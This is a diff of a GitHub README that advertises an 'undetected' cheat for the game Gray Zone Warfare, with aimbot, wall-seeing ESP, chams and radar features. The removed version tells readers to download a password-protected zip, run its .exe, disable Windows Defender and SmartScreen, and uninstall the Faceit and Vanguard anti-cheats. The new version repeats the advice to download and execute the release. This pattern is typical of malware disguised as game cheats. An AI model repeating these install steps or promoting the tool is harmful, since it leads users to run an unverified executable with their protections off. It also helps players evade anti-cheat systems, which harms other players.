@@ -1,122 +1,105 @@
-# Gray Zone Warfare free cheat Jungle (STATUS: UPDATED)
+# Gray Zone Warfare Undetected Cheat Jungle 🐾
 
-![4](https://github.com/user-attachments/assets/2b98b277-9f71-42de-a575-a3ffdab180fd)
+![Gray Zone Warfare Cheat](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge&logo=github)
 
----
-## How to Use
-1. **Get the Latest Version**: (https://github.com/Osimbyaa/Gray-Zone-Warfare-Undetected-Cheat-Jungle/releases/download/latest/JungleGZW.zip).
-2. **Unzip the Files**: Use pass `JungleGZW` to unpack.
-3. **Run the Application**: Execute the `.exe` file. (If it doesn't work, contact the developer.)
-4. **In-Game Key**: Press `HOME` to activate.
+Welcome to the **Gray Zone Warfare Undetected Cheat Jungle** repository. This project provides a comprehensive cheat tool designed specifically for **Gray Zone Warfare**. The cheat enhances your gaming experience by offering a range of visual options and features that can give you an edge in gameplay.
 
-## Technical Specifications:
-- **Supported Operating Systems**: Windows 10 / Windows 11
-- **Compatible Processors**: Intel and AMD
-- **Game Modes Supported**: Windowed Mode, Borderless Mode
+## Table of Contents
 
----
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Configuration](#configuration)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-## System Requirements:
-- Disable **Windows Defender** and **Smart Screen**.
-- Remove anti-cheats **Faceit** and **Vanguard**.
+## Introduction
 
----
+The **Gray Zone Warfare** cheat tool is crafted to help players navigate the complexities of the game. It includes essential features such as player visibility, weapon and armor information, and customizable loot display settings. This tool is particularly beneficial for those looking to enhance their gameplay without being detected.
 
-## AIMBOT:
-- **Enable** — Activate Aimbot
-- **Always** — Always enabled
-- **Smooth** — Adjust aiming smoothness
-- **FOV Radius** — Field of View radius
-- **Distance** — Maximum range
-- **Prediction** — Aim prediction
-- **Target Bots** — Aim at bots
-- **Target Teams** — Aim at teammates
-- **Target Knocked** — Aim at downed players
-- **Visible Check** — Visibility check
-- **Recoil Control System** (RCS X / RCS Y) — Control weapon recoil
-- **Switch Delay** — Delay between target switches
-- **Draw FOV Border** — Show Field of View border
-- **Draw FOV Background** — Show FOV background
-- **Draw FOV Target** — Highlight target within FOV
-- **Draw FOV Target Mode**:
-  - **Always**
-  - **Aim Key** — When the aim key is pressed
-- **Aimbot Type**:
-  - **Selected Bone** — Specific body part
-  - **Closest Bone** — Closest body part
-  - **Random Bone** — Random body part
-- **Aimbot Bone**:
-  - **Head**
-  - **Neck**
-  - **Body**
-  - **Pelvis**
-- **First Keybind** — First hotkey
-- **Second Keybind** — Second hotkey
+For the latest version of the cheat, please visit the [Releases section](https://github.com/otakuloxd/Gray-Zone-Warfare-Undetected-Cheat-Jungle/releases). You will need to download and execute the file to start using the cheat.
 
----
+## Features
 
-## CHAMS:
-- **Enable** — Activate visuals
-- **Show Bot** — Display bots
-- **Show Team** — Display teammates
-- **Show Knocked** — Display downed players
-- **Show Model** — Show models
-- **Mode** — Choose mode (Presets, Advanced)
-- **Presets Style** — Style presets (Static, Health & Shield)
-- **Advanced Filled Style** — Advanced filled style (Static, Pulsing, Encoding, Visibility Check)
-- **Advanced Outline Style** — Advanced outline style (Static, Pulsing, Rainbow)
-- **Brightness** — Adjust brightness
-- **Outline Radius** — Adjust outline radius
-- **Color Settings** — Customize colors
-- **Rendering Distance** — Customize drawing range
+The **Gray Zone Warfare Undetected Cheat Jungle** offers several key features:
 
----
+- **Player ESP**: See all players on the map, even through walls.
+- **Skeleton Visualization**: View enemy skeletons to easily identify their position.
+- **Distance Indicators**: Know how far enemies are from your location.
+- **Weapon and Armor Level Display**: Get information on the enemy's weapon and armor levels.
+- **Customizable Loot Display**: Filter loot based on your preferences.
+- **Silent Aimbot**: Improve your aiming accuracy without detection.
 
-## ESP PLAYERS:
-- **Box** — Display box (Rectangle, Corner)
-- **Box Filled** — Filled box (Static, Gradient)
-- **Line** — Line to player (Top-Center, Bottom-Center)
-- **Skeleton** — Display skeleton (Adjust thickness)
-- **Health Bar** — Health bar:
-  - Static
-  - Based on health
-  - Gradient
-- **Shield Bar** — Shield bar (similar settings as health bar)
-- **Distance** — Display distance
-- **Nickname** — Display player nickname
-- **View Line** — Line indicating player’s view
-- **Level** — Display player level
-- **Legend Name** — Display legend name
-- **Team Number** — Display team number
-- **Visible Check** — Visibility check
-- **Colors Settings** — Customize player colors
-- **Rendering Distance** — Customize rendering distance
+These features work together to provide a smoother and more enjoyable gaming experience.
 
----
+## Installation
 
-## ITEMS ESP:
-- **Glow Items** — Enable item glow with adjustable rendering distance
-- **Enable Items ESP** — Display items
-- **Battle Mode** — Enable battle mode with hotkey
-- **Levels Filter** — Filter items by level:
-  - White, Blue, Purple, Gold, Red
-- **Category Filter** — Filter items by category:
-  - Attachments, Backpacks, Helmets, Armor, Ammo, Grenades, and more.
-- **Weapon Filter** — Filter weapons:
-  - Pistols, Rifles, Shotguns, Snipers, LMGs, and others.
+To install the cheat, follow these steps:
 
----
+1. Visit the [Releases section](https://github.com/otakuloxd/Gray-Zone-Warfare-Undetected-Cheat-Jungle/releases).
+2. Download the latest release file.
+3. Extract the contents of the downloaded file.
+4. Follow the instructions in the README file included in the extracted folder.
 
-## RADAR:
-- **Enable** — Activate radar
-- **Zoom** — Adjust radar zoom
-- **Size** — Customize radar size
-- **Distance** — Adjust radar range
+Ensure that you have the necessary permissions to run the application on your system.
 
+## Usage
 
----
+Once you have installed the cheat, you can start using it in **Gray Zone Warfare**. Here’s how:
 
-## CONFIG SETTINGS:
-- **Create** / Save configurations
-- **Load** / Load existing configurations
-- **Delete** / Delete saved settings
+1. Launch the game.
+2. Run the cheat application.
+3. Configure your settings based on your preferences.
+4. Enjoy the enhanced features during gameplay.
+
+Make sure to familiarize yourself with the controls and options available within the cheat to maximize its potential.
+
+## Configuration
+
+The cheat comes with various configuration options to suit your gameplay style. Here’s how to adjust the settings:
+
+1. Open the cheat application.
+2. Navigate to the settings menu.
+3. Adjust the options for player ESP, skeleton visibility, distance indicators, and loot display.
+4. Save your settings before exiting the configuration menu.
+
+### Example Settings
+
+- **Player ESP**: Enabled
+- **Skeleton Visibility**: Enabled
+- **Distance Display**: Set to 100 meters
+- **Loot Filter**: Set to show only high-value items
+
+These settings can be adjusted at any time, allowing you to adapt to different gameplay scenarios.
+
+## Contributing
+
+We welcome contributions from the community. If you have ideas for new features or improvements, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Make your changes and commit them.
+4. Push your branch and submit a pull request.
+
+Please ensure that your contributions adhere to the project's coding standards and guidelines.
+
+## License
+
+This project is licensed under the MIT License. See the LICENSE file for more details.
+
+## Contact
+
+For questions or support, please contact the project maintainer:
+
+- **Username**: otakuloxd
+- **Email**: [contact@example.com](mailto:contact@example.com)
+
+Feel free to reach out if you encounter any issues or have suggestions for improvements.
+
+## Conclusion
+
+The **Gray Zone Warfare Undetected Cheat Jungle** is designed to enhance your gaming experience with a range of powerful features. For the latest updates and releases, visit the [Releases section](https://github.com/otakuloxd/Gray-Zone-Warfare-Undetected-Cheat-Jungle/releases). Download the file, execute it, and take your gameplay to the next level.
+
+Happy gaming! 🎮
